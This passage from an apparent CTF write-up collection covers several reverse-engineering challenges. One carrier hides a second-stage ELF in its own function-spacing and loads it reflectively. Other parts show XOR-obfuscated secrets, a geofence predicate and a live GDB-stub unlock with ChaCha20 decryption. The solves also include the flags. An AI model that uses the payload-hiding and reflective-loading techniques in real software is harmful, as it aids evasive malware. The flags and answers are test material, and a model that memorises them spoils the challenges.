2. **`main` reads its own unwind table.** Instead of reading payload bytes from any section, `main`:
   - walks its own program headers for `PT_GNU_EH_FRAME` (`p_type == 0x6474e550`);
   - parses the `.eh_frame_hdr` binary-search table, reading the `initial_location` (function start
     address) of every FDE into an array — i.e. it recovers the start address of each of the ~24.8k
     micro-functions.

   This is the step a `strings`/section/overlay scan can never see: nothing is *stored*; the input to
   the decoder is the geometry of the code itself.

3. **The gap decoder.** At `0x995e0` (called with `0x6a2b3c4d` loaded into `edx` at `0x994a0`),
   `main` turns the gap between each pair of consecutive function start addresses into one symbol,
   `gap − 2`, a value in `0..255`. The leading entries carry a header. It then de-obfuscates that
   stream with Huffman-style tables in `.data.rel.ro` (around `0x146810`, referenced RIP-relative at
   `0x997ee`), an `xorshift32` keystream seeded with `0x6a2b3c4d`, and an XOR checksum. The
   disassembly pins the pieces down: the xorshift32 shift triple `<<13, >>17, <<5` appears at
   `0x9965e` and again at `0x99c21`, and `sub $0x2` performs the gap adjustment.

   An independent static re-check backs the scheme up. A short Python parse of the `PT_GNU_EH_FRAME`
   segment (file offset `0x9b600`) reads the `.eh_frame_hdr` encodings `0x1b / 0x03 / 0x3b`,
   `fde_count = 0x60f0` (24,816), and confirms that **24,808 of the 24,815 consecutive start-address
   gaps satisfy `0 <= gap − 2 <= 255`** (minimum gap 2). A few larger gaps (maximum 1,920) fall
   outside that band; how the decoder treats those was not re-derived, and the table decode was not
   re-implemented offline. The point of the re-check is only to confirm that the gaps carry a
   byte-stream of the right shape, not to reproduce the full decode by hand.

4. **Inflate and ELF check.** The gap-decoded stream is DEFLATE-compressed. A puff-style inflater at
   `0x9a090` expands it; `main` then checks the output for `\x7fELF` at `0x99598`
   (`cmpl $0x464c457f,(%rbp)`) and passes it to a reflective loader at `0x9a810`, which calls
   `sysconf`, `mmap`, `memcpy` and `mprotect` through the PLT (plus `getrandom`/`getuid`/`geteuid`)
   to map and run the second stage in-memory. In other words the carrier rebuilds an entire ELF out
   of its own function spacing and never writes it to disk.

5. **Lift the stage-2 image statically (in the sandbox).** Rather than trust the reflective loader,
   we let the carrier rebuild the payload under emulation and stopped it just before it executed
   anything. Inside the project's hardened pwn sandbox (`csctf-pwn:1`, `--network none`) under
   `qemu-x86_64 -g` with `gdb-multiarch`:
   - Break at `base + 0x995c0`. The disassembly shows this block is reached only after the inflater
     (`call 0x9a090` at `0x99572`) returns success, the output length in `r12` passes `> 3`, and the
     `\x7fELF` check at `0x99598` matches. The instructions there are
     `mov %r12,%rsi; mov %rbp,%rdi; call 0x9a810`, so the inflated ELF sits in `[rbp, rbp+r12)`
     immediately before the loader runs — `rbp` is the buffer base, `r12` its length.
   - Dump `[rbp, rbp+r12]` → a 34,192-byte buffer.

   Saved as `payload_stage2.elf`, SHA-256
   `4f864208546b2108ae453292220e297684fe6bb74384e380c95dd9b4b33b06b9`. `file` confirms it is a
   statically linked, stripped ELF64 x86-64 — a self-contained second stage. (Its `strerror` text —
   `Operation not permitted`, `Operation canceled`, … — and two `GCC: (Debian 11.2.0-19)` /
   `GCC: (Debian 12.2.0-14+deb12u1)` toolchain comments suggest a static musl build, but with no
   libc version string the musl label was not independently confirmed.)

6. **Read the authorization string.** The flag is in plain `.rodata` of the dumped ELF — no execution
   needed. The `.rodata` section is at vaddr `0x407000` / file offset `0x7000`, and the flag string
   lands at file offset `0x7070` (vaddr `0x407070`):

   ```
   $ strings -n 6 payload_stage2.elf | grep -iE 'author|CSCTF'
   CSCTF{b3Oz2vgRuhe66X7SaM1B8qhUjfM2hV}
   payload: operation-dawn authorization = %s
   ```

   The format string `payload: operation-dawn authorization = %s` is filled with the flag. The value
   is stable across uid/pid/argv/env (checked in-container), so it is a static constant, not
   runtime-derived — which is why reading `.rodata` is enough and the reflective loader never has to
   run.

**Why it works**

The payload is never stored as bytes. It is encoded in where the functions sit — the spacing between
function start addresses — which the binary reads back from its own `.eh_frame_hdr` unwind table.
Section, string and overlay scans never see it, because the bytes only come into existence once the
layout is decoded at runtime: gaps → symbols (`gap − 2`) → de-obfuscation (Huffman tables +
xorshift32, seed `0x6a2b3c4d`, XOR checksum) → DEFLATE inflate → a complete static ELF, reflectively
loaded. This is why the challenge is tagged steganography and why a static lift beats a pure sandbox
approach: once inflated, the stage-2 is an ordinary ELF with its secret in plain `.rodata`, and you
never have to let unknown second-stage code execute to read it.

**Validation / reproduction**

The dumped region began with a valid ELF header and `file` parsed it as a complete static executable.
The authorization string came out identical across changes to uid, pid, argv and environment inside
the container, confirming a constant rather than a runtime-derived value.

Reproduction: (1) disassemble the carrier; locate `main` at `0x99160` (a `jmp` to the body at
`0x99320`), the gap-decoder at `0x995e0`, the inflater at `0x9a090`, and the reflective loader at
`0x9a810`; (2) confirm the decoder reads `PT_GNU_EH_FRAME` and the `.eh_frame_hdr` FDE table, deriving
bytes from consecutive function-start gaps; (3) in the sandbox (`csctf-pwn:1`, `--network none`,
`qemu-x86_64 -g` with `gdb-multiarch`), break at `base+0x995c0` and dump `[rbp, rbp+r12]` to recover
the 34,192-byte inflated stage-2 ELF; (4) `strings` / static-read its `.rodata` for the
`operation-dawn authorization = %s` value.

`tried.json` records three submissions of the same value: the first two came back `ratelimited` (the
team-wide CTFd rate limit, not a wrong answer), and the third, unchanged, was accepted. No 3-wrong
guard was ever triggered — the flag was correct throughout.

### Command Authority

> Reverse engineering · Easy · BitR1ft  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

```
CSCTF{f96f4417c75121c3d27b039d}
```

**Challenge**

Responders recovered an offline verifier from a checkpoint that controlled a restricted crossing on a
coalition evacuation route in the Operation Dawn theatre. The task is to find the restricted clearance
value the verifier accepts. `command-authority-evidence.zip` (11,968 bytes, SHA-256
`8d48474b9ff2a03f8c407294c42e8530d7fa865fbb5ebf4de653350bc557d4ca`) contains a personnel image and a
password-protected archive. The `CSCTF{...}` in the brief is only the format example; the real clearance
is hidden deeper. The whole solve is static — the stripped PIE is read, never run.

**Approach**

1. **Unpack the evidence.**

   ```sh
   unzip command-authority-evidence.zip
   #   inflating: id_photo.jpg
   #  extracting: pass_bundle.zip
   ```

   The inner zip won't release its contents without a password, but it will list them:

   ```sh
   unzip -l pass_bundle.zip
   #   112  pass.token
   # 14576  field_verifier
   ```

   So the real target is `field_verifier` (the "offline verifier"), plus a 112-byte base64 token it
   takes as input.

2. **Find the archive key in the photo's trailer.** A photo shipped next to a locked archive is a
   classic place to hide the key. First confirm the photo is *only* a photo. `binwalk id_photo.jpg`
   reports `JPEG image, total size: 10567 bytes`, but the file on disk is larger. JPEGs end with the
   two-byte end marker `ff d9`, so look at the raw tail:

   ```sh
   xxd id_photo.jpg | tail -4
   # 00002930: 0145 1450 0145 1450 0145 1450 0145 1450  .E.P.E.P.E.P.E.P
   # 00002940: 0145 1450 07ff d941 5243 4849 5645 2d4b  .E.P...ARCHIVE-K
   # 00002950: 4559 3a61 5053 3678 7871 5032 4366 4e55  EY:aPS6xxqP2CfNU
   # 00002960: 300a                                     0.
   ```

   The marker `ffd9` sits at 0x2945 (image = 0x2947 = 10567 bytes, matching binwalk) while the file runs
   to 0x2962 = 10594: 27 trailing bytes no decoder renders. Pulling the readable part out:

   ```sh
   strings -n 6 id_photo.jpg | grep ARCHIVE
   # ARCHIVE-KEY:aPS6xxqP2CfNU0
   ```

   The string labels itself and has exactly the shape of the missing zip password. Every image viewer
   stops at `ffd9`, which is why the trailer survives unnoticed.

3. **Open the bundle and take stock.**

   ```sh
   unzip -o -P 'aPS6xxqP2CfNU0' pass_bundle.zip
   file field_verifier
   # ELF 64-bit LSB pie executable, x86-64, dynamically linked,
   #   BuildID[sha1]=d293a546119d28f99e0b27ada0017d7259d5edba, stripped
   base64 -d < pass.token | strings
   # role=civilian&id=civ-88213&route=STANDARD-CORRIDOR-7
   ```

   The bundled token decodes to a `role=civilian` record — not the command-authority role the restricted
   branch wants — and the verifier is a stripped x86-64 PIE. So read the program rather than run it,
   starting with its strings:

   ```sh
   strings -n 5 field_verifier | grep -A13 'usage:'
   # usage: field_verifier <token_file_b64>
   # DENIED: integrity check failed
   # read error
   # DENIED: malformed token
   # route / [OK] pass verified / id: %s / role: %s
   # command-authority
   # route: RESTRICTED
   # clearance confirmed
   # route: %s
   # standard clearance only
   # :'xw'uupv"vtpsp"r%sv#qrx%<
   ```

   Two things stand out: a literal `command-authority` role, and one garbage-looking printable string —
   the only non-message text in `.rodata`. Printable-but-wrong is the classic smell of a single-byte XOR.

4. **Find the guard branch.** The ELF is stripped, but radare2's `aaa` pass recovers the functions. Its
   `afl` listing shows a single large `main` at 0x1120 (1,715 bytes) plus the usual glibc stubs, and a
   cross-reference query lands the one use of the role string:

   ```sh
   r2 -q -e scr.color=0 -c 'aaa; axt @ str.command_authority' field_verifier
   # main 0x16b8 [STRN:r--] lea rsi, str.command_authority
   ```

5. **Read what the branch does.** Disassemble that window (GNU objdump; on macOS put Homebrew binutils
   first on PATH so LLVM's `objdump` doesn't shadow it):

   ```sh
   objdump -d --start-address=0x16b8 --stop-address=0x171b field_verifier
   ```

   ```asm
   16b8:  lea    0x9e9(%rip),%rsi        # 20a8  "command-authority"
   16bf:  mov    %r13,%rdi
   16c2:  call   strcmp@plt
   16c7:  test   %eax,%eax
   16c9:  jne    176b                     # role mismatch -> "standard clearance only"
   16cf:  xor    %eax,%eax
   16d1:  lea    0x30(%rsp),%rbx          # stack output buffer
   16d6:  lea    0xa43(%rip),%rcx         # 2120  source bytes
   16e0:  movzbl (%rcx,%rax,1),%edx       # loop body
   16e4:  xor    $0x41,%edx               # key = 0x41
   16e7:  mov    %dl,(%rbx,%rax,1)
   16ea:  add    $0x1,%rax
   16ee:  cmp    $0x1f,%rax               # 31 bytes
   16f2:  jne    16e0
   16f4:  lea ... puts("route: RESTRICTED")
   1705:  lea ... puts("clearance confirmed")
   1711:  mov %rbx,%rdi ; call puts       # the decoded stack buffer
   ```

   The story is short. `strcmp(role, "command-authority")`; on a mismatch control jumps to 0x176b, which
   prints `route: %s` and `standard clearance only`. On a match, `lea 0xa43(%rip),%rcx` resolves to
   `0x16dd + 0xa43 = 0x2120`, and the loop runs 31 iterations (`cmp $0x1f`), XOR-ing each source byte
   with `0x41` into a stack buffer, then `puts` it after `clearance confirmed`. The restricted clearance
   is never stored in the clear — it exists only as 31 obfuscated bytes, decoded on the stack inside a
   branch you can reach only with a command-authority token. The role check decides only whether the
   program *decodes* the secret at runtime; it does nothing to protect the stored bytes.

6. **Read the bytes off disk and decode.** The addresses are virtual, so confirm `.rodata` maps straight
   to file offsets:

   ```sh
   objdump -h field_verifier | grep -E 'Idx|rodata'
   # 16 .rodata  00000280  0000000000002000  ...  00002000  2**5
   ```

   `.rodata` starts at vaddr 0x2000 and file offset 0x2000 alike, so virtual 0x2120 is file offset
   0x2120:

   ```sh
   xxd -s 0x2120 -l 31 field_verifier
   # 00002120: 0212 0215 073a 2778 7727 7575 7076 2276  .....:'xw'uupv"v
   # 00002130: 7470 7370 2272 2573 7623 7172 7825 3c    tpsp"r%sv#qrx%<
   ```

   This is exactly the garbage `strings` printed. You can verify the frame by hand: the six leading
   bytes `02 12 02 15 07 3a`, each XOR `0x41`, decode to `02^41=C`, `12^41=S`, `02^41=C`, `15^41=T`,
   `07^41=F`, `3a^41={` — i.e. `CSCTF{`. Applying the loop's three constants (source 0x2120, length 0x1f,
   key 0x41) to all 31 bytes:

   ```python
   SRC, N, KEY = 0x2120, 0x1F, 0x41
   blob = open("field_verifier", "rb").read()
   print(bytes(b ^ KEY for b in blob[SRC:SRC+N]).decode())
   # CSCTF{f96f4417c75121c3d27b039d}
   ```

   That is exactly what `main` prints after `clearance confirmed` when the role equals
   `command-authority`. No token was forged and the binary never ran.

**Why it works**

Two independent layers, each defeated statically. The photo carries the bundle password in a trailer
past its JPEG end marker, so viewers ignore it while `strings` hands it over in one shot — and that
password is the only thing protecting `pass_bundle.zip`. Inside, the verifier never stores the restricted
clearance in the clear: `main` compares the token's role against the literal `"command-authority"`, and
only that branch decodes 31 bytes at 0x2120 with a single-byte XOR (0x41). The role check decides only
whether the program *decodes* the secret at runtime; it does not protect the stored bytes. Because this
small PIE maps `.rodata`'s virtual addresses directly onto its file offsets, the guarded bytes are
readable at plain file offset 0x2120, and the exact decode reduces to three constants lifted from the
disassembly. No integrity check, token forgery or password guessing is required — the clearance was
sitting in read-only data the whole time, obfuscated only by a reversible one-byte XOR.

**Validation / reproduction**

The decoded bytes start with the `CSCTF{` frame and are all printable, reproducing exactly what the
`command-authority` branch would print. Reproduction: carve the `ARCHIVE-KEY:` trailer from
`id_photo.jpg`, open `pass_bundle.zip` with it, cross-reference `str.command_authority` in
`field_verifier` to `main` at 0x16b8, read the loop's constants (0x2120 / 0x1f / 0x41), and XOR the 31
`.rodata` bytes. Gotcha: on macOS the stock `objdump` is LLVM's and prints different syntax, so put
Homebrew's GNU binutils first on `PATH`. The flag was accepted on the first submission.

### Fence Shift

> Reverse engineering · Medium · Teodor Giurgica  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

```
CSCTF{active_2bbb27_provisioned_3aa227}
```

**Challenge**

A constructed patrol capture shows geofence parameters changing before an aircraft left its assigned
corridor while flying border patrol for an Operation Dawn partner nation. The task: recover the flight
controller's exact decision, then evaluate every reposition request under both the confirmed active state
and the initial provisioned state. The answer is two capture-order acceptance masks, in the format
`ops_notes.txt` gives. Attachment `fence-shift.zip` (10,197 bytes, SHA-256
`f6763830ea9571940e52190d1cc4027d7f11f170b377f9b59b619e4632348fa4`) holds `fcu` (a stripped x86-64 ELF),
`mission.pcapng`, and `ops_notes.txt`. Flag format: `CSCTF{active_AAAAAA_provisioned_PPPPPP}` — each
mask is exactly six lowercase hex digits (a 22-bit value).

**Approach**

`ops_notes.txt` fixes everything except the controller logic: aircraft is MAVLink system/component 1/1
(`192.0.2.11`), ground station 255/190 (`192.0.2.40`), and a route manager (1/191) acknowledges each
reposition. Two rules matter. A ground `PARAM_SET` becomes effective only after the aircraft echoes it
back in a `PARAM_VALUE`; and a `COMMAND_ACK` only means the route manager queued the command — it is not
the fence decision. Repositions carry lat/lon in degrees × 10^7 ("e7") and altitude in metres
(`alt_cm = z * 100`). The accept/reject rule and the 28-byte block format must come out of `fcu`.

1. **Find `main`.** `fcu` is stripped; `_start` loads `main`'s address and calls `__libc_start_main`
   through its GOT slot. `objdump -d` around the entry shows `mov $0x40122b,%rdi`, so `main` is at
   `0x40122b`. `objdump -s -j .rodata fcu` reveals the verdict strings: `ACCEPT` at `0x402004`, `REJECT`
   at `0x40200b`, then `fence`, `rb`, `invalid input`, and the usage line
   `usage: fcu fence <block> <lat_e7> <lon_e7> <alt_cm>`.

2. **Recover the 28-byte block.** `main` requires `argc == 6`, `argv[1] == "fence"`, opens `argv[2]`
   with `"rb"`, `fread`s up to `0x1c` (28) bytes, and insists the read return exactly 28 with the next
   `fgetc` hitting EOF — so the block file is exactly 28 bytes. The loads that follow fix each field's
   width (`mov` = 32-bit, `movzwl` = 16-bit zero-extend) and the step-4 arithmetic fixes meaning and
   signedness:

   | Offset | Type | Meaning |
   |---|---|---|
   | +0 | int32 | centre latitude, e7 |
   | +4 | int32 | centre longitude, e7 |
   | +8 | uint32 | `GF_RADIUS_CM` |
   | +12 | int32 | `GF_ALTMAX_CM` |
   | +16 | int32 | `GF_OFS_E_CM` (shifts longitude) |
   | +20 | int32 | `GF_OFS_N_CM` (shifts latitude) |
   | +24 | uint16 | `GF_MARGIN_PC`, at most 100 |
   | +26 | uint16 | format tag, must be `0x5346` (`"FS"`) |

   `argv[3..5]` go through a `strtoll` wrapper (decimal, int32) to become lat, lon and `alt_cm`.

3. **Recover the decision.** The core (`0x40134e`–`0x40143f`) is integer-only. The constants are
   `0x2317 = 8983`, `0x1388 = 5000`, `0x2710 = 10000`, `0x64 = 100`. The `sar $0x3f` / `and $-10000`
   pair is a branch-free "−10000 if negative, else 0", and `idiv` truncates toward zero. Ported to C:

   ```c
   static int64_t e7(int32_t cm) /* cm -> degrees*1e7, rounded half away from zero */
   { return ((int64_t)cm*8983 + 5000 - (cm < 0 ? 10000 : 0)) / 10000; }

   if (b.tag != 0x5346 || b.margin_pc > 100) return REJECT;
   uint64_t u = (uint64_t)(b.margin_pc + 100) * b.radius_cm;
   if (u > 0x31ffffffff) return REJECT;
   int64_t r    = ((int64_t)(int32_t)(u/100) * 8983 + 5000) / 10000;
   int64_t dlat = lat - (b.lat_e7 + e7(b.ofs_n_cm));
   int64_t dlon = lon - (b.lon_e7 + e7(b.ofs_e_cm));
   return (dlat*dlat + dlon*dlon <= r*r && alt_cm <= b.altmax_cm) ? ACCEPT : REJECT;
   ```

   The verdict is ACCEPT when `dlat² + dlon² <= r²` *and* `alt_cm <= altmax`, measured from the
   offset-shifted centre. Both comparisons are `<=`, the fence is a flat circle in e7 units using the
   same 0.8983 factor for longitude (no `cos(latitude)` correction), and everything is integer
   arithmetic with that exact rounding — which is what makes the edge requests decidable.

4. **Decode the capture.** Wireshark does not dissect this MAVLink v2 over UDP, so a small standard-
   library decoder walks the pcapng blocks, strips Ethernet/IPv4/UDP, and checks each frame's X.25
   checksum including the per-message `CRC_EXTRA` byte (from `common.xml`). MAVLink v2 truncates trailing
   zero bytes, so payloads are right-padded before unpacking. The run reports **213 frames, 0 bad
   checksums** and a clean timeline:

   ```
   pkt 1   1/1    POSITION    lat=457913250 lon=241502100     # fence centre
   pkt 2-6 1/1    PARAM_VALUE radius 4000 / altmax 12000 / ofs 0,0 / margin 0   # provisioned
   ...
   pkt 67  255/190 PARAM_SET  GF_MARGIN_PC = 25
   pkt 68  255/190 REPOSITION #7  x=457913250 y=241506592 z=70   # before confirm -> margin still 0
   pkt 72  1/1     PARAM_VALUE GF_MARGIN_PC = 25                   # confirmation
   pkt 80  255/190 REPOSITION #8  x=457913250 y=241506592 z=70   # same point, now margin 25
   ...
   pkt 136-147  margin->0, radius->3000, ofs_e->1500, ofs_n->-1000 (all confirmed before #15)
   ...
   ```

   All 22 `COMMAND_ACK`s carry result 0 (`MAV_RESULT_ACCEPTED`); all 21 position fixes report the same
   point. Reading the ACKs as fence decisions gives `3fffff` for both masks — the decoy answer.

5. **Replay the state and build the masks.** The provisioned state is the opening burst (never changes).
   The active state applies each `PARAM_SET` only when the matching aircraft `PARAM_VALUE` confirms it.
   For each of the 22 requests, pack the current state into the 28-byte block and run the ported
   predicate; set bit *i* on ACCEPT. The solver (`solve.py`, importing the decoder) prints:

   ```
   active mask 2bbb27, provisioned mask 3aa227
   CSCTF{active_2bbb27_provisioned_3aa227}
   ```

**Why it works**

`fcu` turns a 28-byte parameter block and a requested position into ACCEPT/REJECT with nothing but
deterministic integer arithmetic, so a faithful port gives the same answer for every request. The
capture holds every input the controller used: the centre from the first fix, the provisioned
parameters from the opening burst, the moment each change was confirmed, and the 22 requests. Replaying
the `PARAM_SET`/`PARAM_VALUE` handshake in capture order yields the state the aircraft was actually
using for each request; the provisioned run shows what the original fence would have said. The two masks
differ exactly where the in-flight changes mattered.

The traps all sit on edges, and the integer rounding is what decides them:

- **Provisioned radius** `(4000*8983 + 5000)/10000 = 3593`. #2 at 3500 east is inside, #3 at 3700 east
  is outside. #4 asks for 121 m (above the 120 m ceiling) and fails; #13 asks for exactly 120 m and
  passes because the altitude check is `<=`.
- **#7 vs #8** are both 4492 east of the centre. With the 25 % margin the radius becomes
  `(5000*8983 + 5000)/10000 = 4492`, so the point lies exactly on the circle: #8 (margin 25, confirmed)
  is accepted, #7 (still margin 0) is not. Plain float math (4491.5) or truncation (4491) would wrongly
  reject #8.
- **After the second change** the centre moves by `e7(-1000) = -898` lat and `e7(1500) = 1347` lon, to
  (457912352, 241503447) — exactly #15's point. The new radius is `(3000*8983 + 5000)/10000 = 2695`.
  #21, 2695 north of the shifted centre at 120 m, lies on both the radius and altitude edges and is
  accepted. #20 is inside the provisioned 3593 but outside the shifted 2695.

The active and provisioned masks diverge only at requests #8, #11, #12, #16 and #20 — the requests the
parameter changes affect.

**Validation / reproduction**

The decoder found zero CRC failures across 213 frames, and every edge case was checked by hand against
the recovered formula (radius 3593, the 4492 boundary at margin 25, the −898/+1347 centre shift onto
#15's coordinates, the 2695 double-edge at #21). Reproduction: unpack `fence-shift.zip`; recover the
block layout and predicate from `fcu` at `0x40122b`; run the MAVLink decoder on `mission.pcapng`; replay
the provisioned and active states through the ported predicate to produce the two 22-bit masks. The flag
was accepted on the first submission.

### Ghost Bank

> Reverse engineering · Hard · Chronos Security  
> Points: 546 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{MLwO5fGUzg03SjGJ1anWVEUc}
```

**Challenge**

> An inert relay bench from Brenzava, which supplies relay hardware to the Operation Dawn coalition, was recovered after an unattributed supply-chain compromise. It exposes one stopped GDB Remote Serial Protocol (RSP) endpoint, and the extracted controller image and a historical bench capture came with it. The capture may record an old maintenance session, and nothing in it proves a recorded value is still valid on a live bench.
>
> Work out how the controller activates its sealed diagnostic bank, recover the staged incident tasking and submit the code it contains.

`ghost-bank.zip` carries three files plus a per-team live "bench" reachable as a raw TCP GDB RSP endpoint (`target remote <instance>`):

| File | What it is |
| --- | --- |
| `firmware.bin` | 956-byte AArch64 flat image, load/entry `0x00400000`, sha256 `f0b30ccf…1cdf47` |
| `firmware-load.txt` | Load manifest: MMIO register map (base `0x40000000`) and the exact RSP packet subset the bench stub implements |
| `capture.ndjson` | 8-record RSP capture of an *old* unlock handshake |

The framing hint is explicit: a recorded value is **not** guaranteed valid on a live bench, so the capture is a worked example for reversing the protocol, not a set of values to replay.

The manifest hands over the register map directly:

| Register | Address | Access |
| --- | --- | --- |
| CONTROL | `0x40000000` | r/w |
| PAGE | `0x40000008` | w |
| OFFSET | `0x40000010` | w |
| DATA | `0x40000018` | r |
| CIPHER_LEN | `0x4000001C` | r |
| CHALLENGE_LO | `0x40000020` | r |
| CHALLENGE_HI | `0x40000024` | r |
| KEY | `0x40000028` | w |
| STATUS | `0x40000030` | r |

The stub is all-stop, supports `QStartNoAckMode`, presents a stopped AArch64 thread (`g` is exactly 268 target-order bytes), exposes `qXfer:features:read` + `qXfer:memory-map:read`, and answers only `m`/`M` MMIO accesses (any other width/alignment returns `E01`). There is no flash programming and no file transfer, so the diagnostic bank must be read out *through* this register window.

**Approach / walkthrough**

1. **Reverse the unlock handshake.** `firmware.bin` is a flat AArch64 image, disassembled with capstone at base `0x400000`. The entry routine spins until `CONTROL == 0x41` (the host arming the bench), reads `CHALLENGE_LO/HI` into `ch = (hi<<32)|lo`, writes `PAGE = 7`, computes `k = mix(ch)` and writes it to `KEY` as two little-endian 32-bit halves (low word then high word), writes `CONTROL = 0x93`, and if `STATUS == 3` writes `CONTROL = 0x9c`. The only `bl` in entry, at `0x400060`, targets `mix` at `0x400120`.

2. **Recover `mix` (`0x400120`).** It is an xorshift-multiply finalizer:

   ```
   x ^= 0xa3b195354a39b70d
   x  = ((x >> 16) & 0x7fffffff) ^ ror(x, 47)
   x *= 0x64170d358aa115a1
   x ^= x >> 29
   x  = ror(x, 13)
   x *= 0x65931d9dfc2010db
   x ^= x >> 31
   ```

   The handshake only ever runs `mix` *forward* on a challenge the bench issues, so a faithful forward re-implementation is enough to answer any live challenge — there is no need to invert it.

3. **Check `mix` against the capture.** `capture.ndjson` arms with `M CONTROL=0x41`, reads challenge `0x0123456789abcdef` (`CHALLENGE_LO` bytes `efcdab89` = `0x89abcdef`, `CHALLENGE_HI` bytes `67452301` = `0x01234567`), sets `PAGE=7`, writes `KEY` as bytes `0c5eb2d1` then `d1fcc603`, writes `CONTROL=0x93`, reads `STATUS=3` — and ends there (no follow-up `0x9c`). Running the reversed function: `mix(0x0123456789abcdef) = 0x03c6fcd1d1b25e0c`, whose two LE32 halves are exactly `0c5eb2d1 d1fcc603`. The function is correct, and the capture is only valid for *its own* challenge — a live bench issues a fresh one, so replay is useless and the key must be recomputed from the live `ch`.

4. **Spot the second primitive.** The image also contains a textbook RFC 7539 ChaCha20 that the unlock path never calls: block function at `0x400174` (ten double rounds, quarter-round helper at `0x400090`, eight calls per block, invoked from the XOR routine at `0x400328`), keystream-XOR routine at `0x4002e0` (`key*, in*, out*, len`), block counter starting at 1 (`mov w13,#1` at `0x40030c`). The `"expand 32-byte k"` constant is at file offset `0x3a0`, and a 12-byte nonce string `"SEAL-V01\0\0\0\x01"` sits at file offset `0x3b0`. The 32-byte ChaCha key is **not** in the firmware, so it has to come out of the live bench as a result of a correct unlock. The solver logged that this ChaCha reproduces the RFC test vector (that self-test is not among the saved artifacts).

5. **Drive the live bench.** A small pure-Python RSP driver speaks only the manifest's subset (`qSupported`, `QStartNoAckMode`, then `m`/`M`). The `qXfer` target description and memory map matched the sha256 values published in `firmware-load.txt`, and the memory map showed RAM `0x40000000` length `0x100` — only the register window, nothing hidden there (the fetched XML was not saved, so this cannot be re-checked offline). Reading `STATUS` after each step reveals the state machine:

   ```
   0 idle
     -> M CONTROL=0x41  -> 1   (CHALLENGE populated)
     -> KEY lo/hi       -> 2
     -> M CONTROL=0x93  -> 3   (correct key; CHALLENGE cleared)
     -> M CONTROL=0x9c  -> 4   (host confirms; bank unsealed)
   ```

   A wrong KEY drives `STATUS` 2 → 0 on the `0x93` write. The live stub does **not** perform the firmware's auto-write of `0x9c`, so the host must issue `M CONTROL=0x9c` itself after seeing `STATUS==3`.

6. **DATA is paged, not state-dependent.** An early idea that `DATA` changed with unlock state was wrong — different states returned different first bytes (`b8` idle, `e6` state 3, `ef` state 4) only because the probes landed on different pages. The correction (recorded in `notes.md`) is that `DATA` is addressed by `PAGE` + `OFFSET`, each page a fixed 4 KiB region, `OFFSET` wrapping at `0x1000`, and that writing `PAGE` resets `STATUS` to 0. What looked like a "state-3 blob" was just the content of page 7.

7. **Recover the ChaCha key (page 7).** After a correct unlock (fresh challenge → `mix` → KEY, `0x93` → STATUS 3, host `0x9c` → STATUS 4), page 7 returns 32 non-zero bytes followed by zeros:

   ```
   efc2313872689147df6a06c9ab758e66a3b3d451cf2646f7b7192f88a9aee87a
   ```

8. **Locate the ciphertext (page 3).** Enumerating `PAGE` 0..1023 plus edge values (`65536`, `2147483647`, `4294967295`) and reading `CIPHER_LEN` for each, only **PAGE=3** reports a non-zero length: `CIPHER_LEN = 0x83` (131 bytes). Page 3's data is readable without unlocking — the seal gates only the *key* on page 7, not the ciphertext.

9. **Decrypt.** ChaCha20 (RFC 7539) with key = the 32 page-7 bytes, nonce = `SEAL-V01\x00\x00\x00\x01`, initial counter 1, over the 131-byte page-3 ciphertext yields the staged incident tasking (130 printable characters plus `\n`):

   ```
   TASKING//STAGED-EW//RELAY-BENCH//AUTHKEY CSCTF{MLwO5fGUzg03SjGJ1anWVEUc}//JAM PROFILE: 435.125MHz; TRIGGER: PRIMARY-LINK LOSS//END
   ```

Batches of more than ~150 pipelined RSP packets dropped the TCP session, so batches were kept to 40 packets or fewer.

**Why it works**

The seal protects only the key page, and the key the bench will accept is a deterministic function of the challenge it issues. With `mix` recovered from the firmware, any live challenge can be answered, so the capture exists only to confirm the reversed function — replaying its recorded KEY satisfies only its own recorded challenge. The ciphertext was never protected, and both the cipher and its nonce are in the image, so once page 7 yields the key the decrypt is mechanical. Two independently reversed primitives (`mix` and ChaCha20) chain across the live register interface to produce the flag. The capture is, in effect, a decoy for a naive replay attacker.

**Validation / reproduction**

- `mix` reproduces the captured KEY writes exactly: `mix(0x0123456789abcdef) = 0x03c6fcd1d1b25e0c` → LE halves `0c5eb2d1 d1fcc603`.
- The saved live session (`solve/live/dumps.json`) has challenge `ch = 0x3d1e53754ef16636` and sent key `0xaebba6d67c398867`; `mix(ch)` equals that value, confirming the live unlock used the reversed function. Its unlocked page-7 dump (320 bytes) is the 32 key bytes followed by zeros.
- `firmware.bin[0x3b0:0x3bc]` = `b"SEAL-V01\x00\x00\x00\x01"`; `sha256(firmware.bin)` = `f0b30ccf52d984559b144ca812ef77eedebfe36fdbd8092343ff11b66f1cdf47`, matching `firmware-load.txt` and the capture header.
- A from-scratch RFC 7539 ChaCha20 (saved key, nonce `SEAL-V01\x00\x00\x00\x01`, counter 1) over `solve/live/page3.hex` gives the tasking string above. `page3.hex` holds 139 dumped bytes; the 8 past `CIPHER_LEN` decrypt to noise. The 24-character flag body matches the challenge's `flag_mode=random`, `random_flag_length=24`. The flag was accepted on the first submission (`tried.json`: 1 attempt, `correct`).
- `solve/live/pages.json` has 1030 PAGE probes; only page 3 returns `CIPHER_LEN=0x83`.

Reproduction: unzip; disassemble `firmware.bin` as AArch64 flat @ `0x400000`; recover `mix` and the ChaCha20 routines; confirm `mix` against `capture.ndjson`; against your own live bench, arm (`CONTROL=0x41`), read the live `CHALLENGE`, write `KEY = mix(ch)` with `PAGE=7`, `CONTROL=0x93`, then `CONTROL=0x9c`; read 32 key bytes from page 7; set `PAGE=3`, read `CIPHER_LEN` (131) and the ciphertext; ChaCha20-decrypt and read the flag. Saved drivers: `solve/unlock_dump_key.py`, `solve/page_enum.py`, `solve/dump_page3.py`.

Gotcha: pipelining more than ~150 RSP packets per TCP batch drops the session — keep batches ≤ 40. All live work was against our own per-team bench only, using the documented RSP subset; no scanning, flooding, or off-target requests. The one codex hand-off tried here failed to start ("Daybreak unavailable") and contributed nothing; `codex_result.md` is empty.

### Ground Lock

> Reverse engineering · Easy · Chronos Security  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{HALCYON_1B5FC6D72036689A}
```

The binary prints the token with `CSCTF{%.*s}`, so the flag is simply the accepted 24-byte service code wrapped in `CSCTF{}`; the recovered code is `HALCYON_1B5FC6D72036689A`.

**Challenge**

